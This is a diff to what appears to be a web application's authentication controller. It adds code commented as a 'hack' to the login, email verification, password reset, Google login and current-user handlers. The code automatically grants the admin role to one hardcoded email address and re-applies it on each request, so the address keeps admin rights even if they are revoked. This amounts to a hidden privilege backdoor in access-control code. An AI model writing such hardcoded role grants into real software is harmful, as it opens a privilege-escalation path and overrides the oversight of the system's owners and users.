@@ -102,7 +102,7 @@ const login = async (req, res) => {
             });
         }
         // Hack: ensure this specific email is admin
-        if (user.email === "blshaer@outlook.com" && user.role !== "admin") {
+        if (user.email.toLowerCase() === "blshaer@outlook.com" && user.role !== "admin") {
             user.role = "admin";
             await user.save();
         }
@@ -148,6 +148,10 @@ const verifyEmail = async (req, res) => {
         }
         user.isVerified = true;
         user.verificationToken = undefined;
+        // Hack: ensure this specific email is admin
+        if (user.email.toLowerCase() === "blshaer@outlook.com" && user.role !== "admin") {
+            user.role = "admin";
+        }
         await user.save();
         const tokenGenerated = user.getSignedJwtToken();
         res.status(200).json({
@@ -234,6 +238,10 @@ const resetPassword = async (req, res) => {
         user.password = req.body.password;
         user.resetPasswordToken = undefined;
         user.resetPasswordExpire = undefined;
+        // Hack: ensure this specific email is admin
+        if (user.email.toLowerCase() === "blshaer@outlook.com" && user.role !== "admin") {
+            user.role = "admin";
+        }
         await user.save();
         res.status(200).json({
             success: true,
@@ -342,6 +350,11 @@ const googleLogin = async (req, res) => {
                 message: user.banMessage || "Your account has been banned. Please contact support."
             });
         }
+        // Hack: ensure this specific email is admin
+        if (user.email.toLowerCase() === "blshaer@outlook.com" && user.role !== "admin") {
+            user.role = "admin";
+            await user.save();
+        }
         res.status(200).json({
             success: true,
             user: {
@@ -375,6 +388,11 @@ const getMe = async (req, res) => {
                 isBanned: true,
                 message: user.banMessage || "Your account has been banned. Please contact support."
             });
+        }
+        // Hack: ensure this specific email is admin
+        if (user.email.toLowerCase() === "blshaer@outlook.com" && user.role !== "admin") {
+            user.role = "admin";
+            await user.save();
         }
         res.json({
             id: user._id.toString(),
